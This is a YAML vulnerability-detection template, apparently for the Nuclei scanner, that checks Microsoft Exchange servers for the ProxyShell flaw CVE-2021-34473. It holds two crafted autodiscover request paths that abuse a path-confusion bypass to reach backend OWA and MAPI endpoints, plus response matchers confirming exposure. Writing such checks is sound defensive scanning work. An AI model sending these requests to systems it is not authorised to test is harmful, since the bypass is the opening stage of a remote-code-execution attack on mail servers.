id: yaml-poc-microsoft-exchange_server-logical-CVE-2021-34473
info:
  name: Yaml Poc Microsoft Exchange_Server Logical Cve 2021 34473
  author: jiapeng.han
  severity: critical
  description: 'Converted from xpoc: yaml-poc-microsoft-exchange_server-logical-CVE-2021-34473'
  tags: cve
  classification:
    cve-id: CVE-2021-34473
  reference:
  - http://packetstormsecurity.com/files/163895/Microsoft-Exchange-ProxyShell-Remote-Code-Execution.html
  - https://help.aliyun.com/noticelist/articleid/1060886526.html
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
  - https://nvd.nist.gov/vuln/detail/CVE-2021-34473
  - https://packetstormsecurity.com/files/163895/Microsoft-Exchange-ProxyShell-Remote-Code-Execution.html
http:
- method: GET
  path:
  - /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
  redirects: false
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
- method: GET
  path:
  - /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
  headers:
    Accept: '*/*'
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - Exchange MAPI/HTTP Connectivity Endpoint
